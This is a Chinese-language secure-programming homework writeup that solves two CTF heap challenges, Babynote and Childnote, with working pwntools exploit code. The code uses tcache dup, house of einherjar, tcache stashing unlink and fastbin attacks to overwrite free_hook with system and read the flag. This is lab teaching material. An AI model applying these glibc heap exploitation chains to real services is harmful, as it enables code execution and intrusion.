###### tags: `程式安全`
# Secure Programming HWB Writeup
## Babynote
### 解法
菜單題，首先看一下功能
#### create
可以使用10次malloc，size為0x20到0x80，會把pointer存起來，並在另一個array把值設成1，紀錄有在使用，writeup用inuse來稱呼
#### show
如果index沒超界+pointer不為null+inuse為true，就可以印出chunk的內容到\0
#### edit
如果index沒超界+pointer不為null+inuse為true，就可以寫0x18長度的內容到chunk裡面
#### delete
如果index沒超界+pointer不為null，就可以free chunk，並把inuse改成0
這邊的檢查條件沒有inuse也可以free，也沒有清掉pointer，有UAF可以做double free
#### 攻擊思路
可以malloc加上有UAF，所以用最簡單的tcache dup就行，目標是把free_hook蓋掉
這題的關鍵在於edit跟show要在inuse=1才能用，delete完inuse就會被改成0，必須要創造在同個位置但不同index的chunk才能double free，也就是要有share pointer
#### tcache dup
先create 0x20的chunk A，delete它，再create 0x20的chunk B，這時候A跟B就具有同位置的pointer
接著delete A，tcache就會有一個chunk，然後用B去edit把key改成0，就可以再delete A，完成double free
由於counter要3才能執行tcache dup，要再double free 1次
再多兩次double free，原因是沒有libc base，要做兩次tcache dup才行

此時tcache的fd會指向自己，所以用B去show就可以拿到heap相關的address，事先算好位置扣掉offset就可以算出heap base

到這邊為止的code如下，總共花2次create

```python=
create(0x18, 'doge') #0
delete(0)
# get share pointer
create(0x18, 'doge') #1
delete(0)
# set key to 0 to bypass double free check
edit(1,p64(0)+p64(0))
# get pointer to itself to find heap base
delete(0)
# double free to use tcache dup
for i in range(4):
    edit(1,p64(0)+p64(0))
    delete(0)
heap_base = u64(show(1)+b'\x00\x00')-0x2a0
print(hex(heap_base))
```

#### leak libc base
完成tcache dup之後，已經可以malloc到任意位置了，但是還缺少libc base，malloc的大小落在fastbin裡面，無法取得libc相關的address，必須做出0x90以上的chunk free進unsorted bin才行

可以malloc兩塊chunk C跟D在裡面做出假的chunk，假的chunk size大於等於0x90就行，這邊選擇0xd0的大小，malloc的chunk則選擇0x80的大小
由於把chunk free進unsorted bin的時候，他會檢查下個chunk是不是inuse，檢查方法是看下下個chunk的PREV_INUSE bit，所以要在create B的時候先偽造好，不然edit會因為長度限制改不到

先在A+0xd0的位置p1補好最小chunk size 0x21，p1+0x20再補好0x21，讓unsorted bin覺得下個chunk有在使用

接著為了可以在delete完用show，一樣先delete C，再malloc 0x80的chunk E取得share pointer

之後發動tcache dup，先create 0x20的chunk，把fd改成C的address再malloc一次0x20的chunk，tcache指向C的address，同時把fd改成A的fd的address，為下次tcache dup做準備
這時再malloc一次0x20就會拿到C-0x10位置的chunk F，把F的bk位置改成0xd1完成fake chunk，這樣C的chunk的size就被偽造成0xd0，tcache會再次指回A

然後瘋狂double free C把0xd0的tcache填滿，再free1次就會進unsorted bin，這時候fd跟bk的位置就會出現指向unsorted bin的address，跟libc相關
用E來show就可以拿到unsorted bin的address(C的inuse被清掉不能show)，減掉unsorted bin的offset就得到libc base

這部份的code如下，總共6次create，加上第一部份的2次為8次:
```python=
create(0x78,'doge') #2
create(0x78,b'\x00'*0x48+p64(0x21)+b'\x00'*0x18+p64(0x21)) #3
delete(2)
# get share pointer
create(0x78,'doge') #4

# execute tcache dup attack
create(0x18,p64(heap_base+0x2b0)) #5
# set fd to continue use tcache dup
create(0x18,p64(0)+p64(0)+p64(heap_base+0x2a0)) #6
# fake size
create(0x18,p64(0)+p64(0xd1)) #7
# fill 0xd0 tcache
for i in range(7):
    delete(2)
    edit(4,p64(0)+p64(0))
# put chunk in unsorted bin
delete(2)
# unsorted bin bk will point to main arena, thus can infer libc base
libc_base = u64(show(4)+b'\x00\x00')-0x1ebb80-0x60
print(hex(libc_base))
```
#### overwrite free_hook and get shell
回到tcache dup的部份，這時counter為2(5-上次攻擊用的3)，tcache指向A的fd
用B去edit先把fd改成free_hook-0x8的位置，A的inuse為0不能edit，這樣就可以省一次create
-0x8的原因是可以順便把system的參數放好
接著create 0x20的chunk兩次拿到G跟H，第一次create完tcache會指向free_hook-0x8，第二次create就會拿到該位置的chunk，content放好/bin/sh跟事先算好的system address(libc+system offset)
最後free H就會call free_hook裡面放好的system，參數為H開頭的/bin/sh，成功get shell
然後cat /home/Babynote/flag就得到flag

最後的code如下，這邊2次create，跟前面加起來剛好10次:
```python=
# overwrite free hook
# minus 8 to write /bin/sh
edit(1,p64(libc_base+0x1eeb28-8))
create(0x18,'doge') #8
create(0x18,b'/bin/sh\x00'+p64(libc_base+0x55410)) #9

# trigger free hook function
delete(9)

r.interactive()
```

## Childnote
### 解法
這題一樣是個菜單題，不過跟babynote不太一樣
#### create
首先看到create的部份，可以使用17次，是用calloc
size限制為0x7F到0x100，但是他會多alloc 8個byte來把你可以寫的size存進去原本放fd的地方，在writeup中用edit size來表達以免混淆，輸入的內容就從第9個byte開始放，使用readstr來讀取

#### readstr
用read讀，不過它在讀取完成的時候，多放了個0，這樣會造成off by null byte的問題，是個可以利用的地方

#### show
只要index沒超界跟pointer不是null，就可以從edit size後面開始印string直到\0

#### edit
接著看edit，只要index沒超界跟pointer不是null，就可以從edit size後面開始寫入edit size長度的內容，一樣用readstr寫入所以會有off by null byte
值得注意的是如果可以修改edit size，就可以寫到超界的地方，形成heap overflow

#### free
只要index沒超界跟pointer不是null，就可以free掉chunk，可是free完沒有清掉pointer，有use after free漏洞

#### 初步攻擊思路
create用的是calloc，無法使用tcache dup
size最小限制為0x78+0x8(edit size)+0x10(padding)=0x90，超過fastbin的範圍，也無法使用fastbin attack

所以最先考慮的是tcache stashing unlink，可以蓋一個大值到任意位置，根據上課教學，選擇蓋global_max_fast來擴展fastbin範圍讓fastbin attack可以成功

但是這題要執行tcache stashing unlink有幾個障礙
1.沒有malloc，必須在tcache為6個的情況有辦法讓同size的chunk進入smallbin
2.做好6個tcache跟1個smallbin的chunk之後，無法修改smallbin的bk，因為此時edit size會指向smallbin的位置，這個值過大，read會壞掉

問題1可以利用unsorted bin的特性解決還不急
問題2比較麻煩，即使堆好chunk之後也無法攻擊
為了解決問題2，勢必要做出overlap chunk這種可以heap overflow的情況，讓前面的chunk可以修改small bin chunk的bk

#### house of einherjar
利用off by null byte的關鍵字，成功找到了house of einherjar這個可以做出overlap chunk的攻擊

這個攻擊的關鍵是利用下面這段consolidate backward的code
如果free的時候chunk的PREV_INUSE bit為0，就會跟前面的chunk合併
合併的chunk位置是-((long) prevsize)，所以只要修改prevsize到fake chunk的位置就可以往前面的fake chunk做合併，做出overlap chunk
```c=
        /* consolidate backward */

        if (!prev_inuse(p)) {

            prevsize = prev_size(p);

            size += prevsize;

            p = chunk_at_offset(p, -((long) prevsize));

            unlink (off, p, bck, fwd);
        }
```
具體攻擊流程長這樣：
1.填滿0x100的tcache
2.create一個0x100的chunk A用來在裡面做fake chunk，並用off by null byte把下個chunk B的PREV_INUSE蓋成0
3.create一個0x100的chunk B拿來觸發consolidate backward
4.create一個guard chunk避免chunk B free的時候跟top chunk合併
5.在chunk A裡面用edit偽造一個chunk C，同時將chunk B前面的prev_size改成到C的距離，這樣剛好寫滿edit長度，造成chunk B的PREV_INUSE bit被寫成null
6.free掉B，觸發consolidate backward，unlink過後讓B跟C合併進入unsorted bin
7.calloc新的chunk D，此時A與D範圍重疊，達到overlap chunk

但是直接這樣做會噴corrupted double-linked list的錯，因為他會去檢查前面的fake chunk的fd->bk跟bk->fd有沒有指回來，沒有就代表double-linked list壞掉了
```c=
if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");
```
所以在A偽造C之前在放一個假的fd跟bk指到C的開頭，然後C的fd跟bk，就指到假的fd-0x10的位置就可以通過這個檢查
偽造的heap base可以在塞完tcache之後看第一個chunk的bk位置-0x10就可以拿到，因為tcache的key會跟heap base有關(現在才知道XD)

到這邊為止的code如下，總共用了10次create，7次tcache＋2次backward merge+1次guard chunk
```python=
# fill tcache of size 0x100
for i in range(7):
    create(0xF0,'doge') #0-6
    delete(i)
# leak heap base
heap_base = u64(show(0)+b'\x00\x00') - 0x10
print(f"heap base: {hex(heap_base)}")
# start house of einherjar
create(0xF0,'doge') #7
create(0xF0,'doge') #8
# guard chunk
# b90
create(0xE0,'doge') #9

# generate fake chunk, fake prev_size and off by null byte to clear PREV_INUSE bit
edit(7,p64(0)+p64(0)*12+p64(heap_base+0xa20)+p64(heap_base+0xa20)+p64(0)+p64(0x71)+p64(heap_base+0xa00)+p64(heap_base+0xa00)+p64(0)*10+p64(0x70))
# trigger backward merge to get overlap chunk
delete(8)
```

#### tcache stashing unlink
做完house of einherjar之後，已經可以利用A去改C的edit size來做到read不會爆掉的最大長度的heap overflow了，非常強大
要完成tcache stashing unlink，要經過這些過程:
1.該size的tcache有6個chunk
2.smallbin裡面有一個bk被改成tranpoline的chunk
3.tranpoline chunk的fd指向small bin chunk，bk指向global_max_fast-0x10的位置
4.calloc smallbin size的chunk觸發tcache stashing unlink

1很明顯沒什麼問題，要想的是2跟3
#### leak libc
先滿足2跟3的共同需求libc base，C在unsorted bin裡面所以的確有libc base，但問題是沒有C的pointer就不能用show
直接從A蓋到C的fd那邊的話，bk開頭會被插\0，show會讀不到
所以還是直接calloc拿pointer最快，calloc一個0xF0的chunk E拿到pointer後用show剛好就可以讀到bk位置指向unsorted bin的pointer，扣掉offset就是libc base
#### 1
都有pointer了，先把1搞定
次數快不夠用了，很明顯不能再靠create把東西放進tcache
因為有overlap chunk，可以直接改chunk size再delete就會進到對應的tcache
利用chunk A的heap overflow把E的size改成0x91，delete就會進到0x90的tcache
接著chunk A的heap overflow把E的fd跟key改成0，再delete完成double free，做到tcache有6個為止
#### 2
2的部份難點是不能讓tcache滿又要讓smallbin有東西
可以利用unsorted bin在allocate一個chunk的時候會去traverse整個unsorted bin的chunk，把size比allocate size小的chunk丟進smallbin跟largebin的特性來完成

unsorted bin的entry只會紀錄fd跟bk不會紀錄大小，所以可以直接把unsorted bin的size改成0x91，並在下面0x90的地方補好prev_size 0x90跟size 0x90(size不為0且PREV_INUSE為0就行）
這樣再calloc一次比0x90大的chunk，unsorted bin就會把0x90的chunk放進smallbin裡面

之後用heap overflow把smallbin的bk改成tranpoline的位置就好，tranpoline在3裡面講

#### 3
tranpoline我是直接用fake chunk C下面0x90的地方來做，size設91，然後fd指向fake chunk C位置，bk指向libc+事先算好的global_max_fast offset-0x10的位置

#### 4
create一個size為0x90的chunk來觸發tcache stashing unlink，成功將global_max_fast改成small bin address

這部份的code如下，到這邊總共用了13次create，多的三次是1次create拿到fake chunk的pointer+1次放chunk到smallbin+1次觸發tcache stashing unlink

```python=
# leak libc base and get pointer to do double free
create(0xF0,'doge') #10
delete(10)

libc_base = u64(show(10)+b'\x00\x00') - 0x1ebbe0
print(f"libc base: {hex(libc_base)}")
global_max_fast_offset = 0x1eeb80
print(f"global_max_fast address: {hex(libc_base+global_max_fast_offset)}")
# start tcache stashing unlink to overwrite global_max_fast
# fill tcache 0x90 to 6 by double free
for i in range(6):
    edit(7,p64(0)+p64(0)*14+p64(0)+p64(0x91)+p64(0)+p64(0))
    delete(10)

# fake read size
edit(7,p64(0)+p64(0)*14+p64(0)+p64(0x91)+p64(0x2f8))
# fake unsorted bin chunk size
# ab0 fake prev size
# ab8 fake size 0x90
# b40 second fake prev size
# b48 second fake size 0xe0
# c20 guard fake prev size 
# c28 guard chunk size
edit(10,p64(0)*15+p64(0x90)+p64(0x90)+p64(0)+p64(0)+p64(0)*14+p64(0)+p64(0xe1)+p64(0)*26+p64(0)+p64(0x101))
# restore fd and bk to unsorted bin
edit(7,p64(0)+p64(0)*14+p64(0)+p64(0x91)+p64(libc_base+0x1ebbe0)+p64(libc_base+0x1ebbe0))

# traverse unsorted bin to put 0x90 in small bin
# c80
create(0xF0,'doge') #11

# fake read size
edit(7,p64(0)+p64(0)*14+p64(0)+p64(0x91)+p64(0x1f8))
# fake one free chunk's fd and bk to serve as tranpoline and fake guard chunk read size for fastbin attack
edit(10,p64(0)*15+p64(0)+p64(0x91)+p64(heap_base+0xa20)+p64(libc_base+global_max_fast_offset-0x10)+p64(0)*14+p64(0x90)+p64(0xe0)+p64(0)*9+p64(0xF1)+p64(0x110)+p64(0)+p64(0)*14+p64(0)+p64(0x101))
# restore fd to small bin and fake bk to tranpoline
edit(7,p64(0)+p64(0)*14+p64(0)+p64(0x91)+p64(libc_base+0x1ebc60)+p64(heap_base+0xab0))
# trigger tcache stashing unlink to overwrite global_max_fast
create(0x80,'doge') #12
```

#### fastbin attack
現在還剩4次create，因為heap overflow的關係，fastbin attack只要2次就可以完成，不需要額外的1次去改掉fd

只要可以找到malloc_hook上面0x110範圍內有0x9X-0xFX以及0x1開頭的值，疊好ROP chain再calloc就可以順利完成攻擊

不過並沒有，0xff開頭的值超過範圍了，所以必須先edit fastbin attack拿到的chunk變出0xf0的值，再做第兩次fastbin attck來達到overlap chunk，利用heap overflow去改malloc_hook
但是兩次fastbin attack就把次數用光了，沒次數來create

不能create的話可以改成蓋free_hook，只要在free_hook上面做出overlap chunk一樣可以一路蓋到free_hook，就不需要再create1次，還不用串ROP chain

找了一下發現libc_base+0x1ed980的地方有個0x1開頭的值，這樣-1剛好變0x100，可以calloc成功
calloc成功後edit創造0x100的值再fastbin attack一次做出overlap chunk
然後改第二個chunk的edit size一路heap overflow到free_hook，把值改成system的address

最後把一個chunk的fd改成'cat /home/Childnote/flag'，再free那個chunk就可以拿到flag

實際執行起來卻沒出現，然後不死心再跑一次就噴flag了???
照理說蓋的那個區塊的值都是0應該不會出事，問jwang後，他說MTU只有1500
read太多東西會被切成多個封包，導致蓋不到free_hook

不過既然有機會成功就代表有機率不會被切開，只要在timeout之前edit幾百次就有高機率會成功，有一次蓋到free_hook就對了

調到剩五次的話就可以蓋malloc_hook不用靠賽了XD，只是想放寒假了，原諒我QQ

fastbin attack的code如下：
```python=
# start fastbin attack
# free c80 chunk to fastbin
delete(11)
# libc_base+0x1ed980-1
# use guard chunk in b90 to modify c80's fd to 0xff chunk above malloc hook
edit(9,p64(0)*12+p64(0x101)+p64(0)*14+p64(0)+p64(0x101)+p64(libc_base+0x1ed980-1))
print(f"first fastbin attack chunk address: {hex(libc_base+0x1ed980-1)}")
create(0xF0,'doge') #13
# get chunk above malloc hook
create(0xF0,'doge') #14

# edit chunk to generate 0x100
edit(14,p64(0)*10+p64(0x010000))

# start second fastbin attack to create overlap chunk
# free c80 chunk to fastbin again
delete(11)
#  use guard chunk in b90 to modify c80's fd to 0xf1 chunk inside previous fastbin attack chunk
edit(9,p64(0)*12+p64(0x101)+p64(0)*14+p64(0)+p64(0x101)+p64(libc_base+0x1ed9e0))
print(f"second fastbin attack chunk address: {hex(libc_base+0x1ed9e0)}")
create(0xF0,'doge') #15
# get chunk above malloc hook
create(0xF0,'doge') #16

# fake read size of second fastbin attack chunk at libc_base+0x1eba50+0x10
edit(14,p64(0)*10+p64(0x010000)+p64(0x114000))
# overwrite free_hook by system address
for i in range(800):
    print(f"edit {i} times")
    edit(16,p64(0)*50+p64(0)*500+p64(libc_base+0x55410))
# prepare system parameter
edit(7,p64(0)+p64(0)*14+p64(0)+p64(0x91)+b'cat /home/Childnote/flag')
# trigger free_hook to get flag
delete(10)

r.interactive()
```















